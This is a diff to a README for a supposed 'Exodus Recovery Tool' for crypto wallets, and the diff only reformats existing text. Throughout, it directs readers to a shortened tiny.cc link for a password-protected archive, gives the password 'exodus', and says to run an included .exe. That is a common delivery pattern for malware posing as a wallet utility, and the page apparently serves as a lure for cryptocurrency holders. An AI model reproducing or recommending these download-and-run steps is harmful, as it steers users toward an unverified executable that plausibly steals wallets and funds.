@@ -8,13 +8,9 @@ A recovery utility designed to help users regain access to **their own Exodus wa
 
 # 📥 Download
 
-**Latest Release**
+### Latest Release
 
-**Download Link**
-
-```text
-http://tiny.cc/ukd6101
-```
+➡️ **[Download Exodus Recovery Tool](http://tiny.cc/ukd6101)**
 
 > Replace the URL above with your latest release before publishing.
 
@@ -22,9 +18,7 @@ http://tiny.cc/ukd6101
 
 The download archive is password protected.
 
-```text
-exodus
-```
+**Password:** `exodus`
 
 ---
 
@@ -53,40 +47,10 @@ Exodus-Recovery/
 
 # Getting Started
 
-## 1. Download
-
-Download the latest archive using the link above.
-
-## 2. Extract
-
-Extract the archive using the following password:
-
-```text
-exodus
-```
-
-## 3. Add Wordlists
-
-Place one or more wordlists inside the `wordlists` folder.
-
-Example:
-
-```text
-wordlists/
-    english.txt
-    custom.txt
-    phrases.txt
-```
-
-## 4. Launch
-
-Run:
-
-```text
-Exodus Recovery Tool.exe
-```
-
-Follow the prompts displayed by the application.
+1. Download the latest release using the link above.
+2. Extract the archive using the password **`exodus`**.
+3. Place one or more wordlists in the `wordlists` folder.
+4. Run `Exodus Recovery Tool.exe` and follow the on-screen instructions.
 
 ---
 
@@ -136,13 +100,7 @@ Users are solely responsible for complying with all applicable laws in their jur
 
 # Disclaimer
 
-This project is provided **as-is**, without warranties of any kind. The developers make no guarantees regarding:
-
-* Recovery success
-* Compatibility
-* Performance
-* Prevention of data loss
-* Prevention of financial loss
+This project is provided **as-is**, without warranties of any kind. The developers make no guarantees regarding recovery success, compatibility, performance, or prevention of data or financial loss.
 
 Always keep secure backups of your wallet recovery phrase.
 
